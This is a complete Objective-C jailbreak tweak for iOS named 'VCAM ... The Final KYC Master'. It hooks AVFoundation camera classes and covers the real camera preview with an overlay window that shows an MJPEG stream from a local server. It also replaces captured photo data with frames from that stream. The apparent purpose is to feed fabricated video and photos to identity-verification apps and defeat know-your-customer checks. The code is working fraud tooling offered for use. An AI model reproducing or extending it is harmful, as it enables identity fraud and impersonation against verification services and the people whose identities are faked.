// VCAM V127.0: The Final KYC Master - MJPEG Passthrough Engine
#import <UIKit/UIKit.h>
#import <AVFoundation/AVFoundation.h>
#import <objc/runtime.h>

static BOOL enabled = YES;
static NSString *streamURL = @"http://192.168.1.44:8889/live/stream";
static UIWindow *vcamWindow = nil;
static UIImageView *vcamDisplay = nil;
static UIImage *lastValidFrame = nil;
static NSMutableData *mBuffer = nil;

@interface VCamPassthroughWindow : UIWindow @end
@implementation VCamPassthroughWindow
- (UIView *)hitTest:(CGPoint)point withEvent:(UIEvent *)event {
    UIView *hitView = [super hitTest:point withEvent:event];
    if (hitView == self || hitView == self.rootViewController.view || hitView == vcamDisplay) return nil;
    return hitView;
}
@end

@interface VCamFetcher : NSObject <NSURLSessionDataDelegate> + (instancetype)shared; - (void)start; @end
@implementation VCamFetcher
+ (instancetype)shared { static VCamFetcher *s = nil; static dispatch_once_t o; dispatch_once(&o, ^{ s = [[self alloc] init]; }); return s; }
- (void)start {
    mBuffer = [NSMutableData data];
    NSURLSession *s = [NSURLSession sessionWithConfiguration:[NSURLSessionConfiguration ephemeralSessionConfiguration] delegate:self delegateQueue:[NSOperationQueue mainQueue]];
    [[s dataTaskWithURL:[NSURL URLWithString:streamURL]] resume];
}
- (void)URLSession:(NSURLSession *)s dataTask:(NSURLSessionDataTask *)t didReceiveData:(NSData *)d {
    [mBuffer appendData:d];
    const unsigned char *b = (const unsigned char *)mBuffer.bytes; NSInteger len = mBuffer.length;
    for (NSInteger i = 0; i < len - 1; i++) {
        if (b[i] == 0xFF && b[i+1] == 0xD8) {
            for (NSInteger j = i + 1; j < len - 1; j++) {
                if (b[j] == 0xFF && b[j+1] == 0xD9) {
                    UIImage *img = [UIImage imageWithData:[mBuffer subdataWithRange:NSMakeRange(i, j - i + 2)]];
                    if (img) { lastValidFrame = img; if (vcamDisplay) vcamDisplay.image = img; }
                    [mBuffer replaceBytesInRange:NSMakeRange(0, j + 2) withBytes:NULL length:0]; return;
                }
            }
        }
    }
}
@end

static void setup_vcam_master(void) {
    if (vcamWindow) return;
    dispatch_async(dispatch_get_main_queue(), ^{
        vcamWindow = [[VCamPassthroughWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
        vcamWindow.windowLevel = UIWindowLevelAlert + 5000;
        vcamWindow.backgroundColor = [UIColor clearColor];
        vcamWindow.userInteractionEnabled = YES;
        vcamWindow.rootViewController = [[UIViewController alloc] init];
        vcamWindow.hidden = NO;
        
        vcamDisplay = [[UIImageView alloc] initWithFrame:vcamWindow.bounds];
        vcamDisplay.contentMode = UIViewContentModeScaleAspectFill;
        vcamDisplay.userInteractionEnabled = NO;
        [vcamWindow.rootViewController.view addSubview:vcamDisplay];
        
        [[VCamFetcher shared] start];
    });
}

%hook AVCaptureVideoPreviewLayer
- (void)layoutSublayers {
    %orig;
    if (enabled) {
        setup_vcam_master();
        vcamWindow.hidden = NO;
        AVCaptureSession *s = self.session; BOOL f = NO;
        if (s) {
            for (id i in s.inputs) {
                if ([i isKindOfClass:objc_getClass("AVCaptureDeviceInput")] && ((AVCaptureDeviceInput *)i).device.position == 2) { f = YES; break; }
            }
        }
        vcamDisplay.transform = f ? CGAffineTransformMakeScale(-1, 1) : CGAffineTransformIdentity;
        [self setOpacity:0.01];
    }
}
%end

%hook AVCapturePhotoOutput
- (void)capturePhotoWithSettings:(AVCapturePhotoSettings *)s delegate:(id)d {
    if (enabled && lastValidFrame) objc_setAssociatedObject(s, "vcamS", lastValidFrame, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
    %orig;
}
%end

%hook AVCapturePhoto
- (NSData *)fileDataRepresentation {
    UIImage *snap = objc_getAssociatedObject([self resolvedSettings], "vcamS");
    if (snap) return UIImageJPEGRepresentation(snap, 0.95);
    return %orig;
}
- (struct CGImage *)CGImageRepresentation { UIImage *snap = objc_getAssociatedObject([self resolvedSettings], "vcamS"); if (snap) return snap.CGImage; return %orig; }
%end

%hook AVCaptureSession
- (void)stopRunning { %orig; if (vcamWindow) vcamWindow.hidden = YES; }
%end

%ctor {
    NSDictionary *p = [NSDictionary dictionaryWithContentsOfFile:@"/var/mobile/Library/Preferences/com.murkaska.vcampro.plist"];
    if (p) {
        enabled = p[@"enabled"] ? [p[@"enabled"] boolValue] : YES;
        if (p[@"rtspURL"]) streamURL = [p[@"rtspURL"] stringByReplacingOccurrencesOfString:@"/index.m3u8" withString:@""];
    }
}
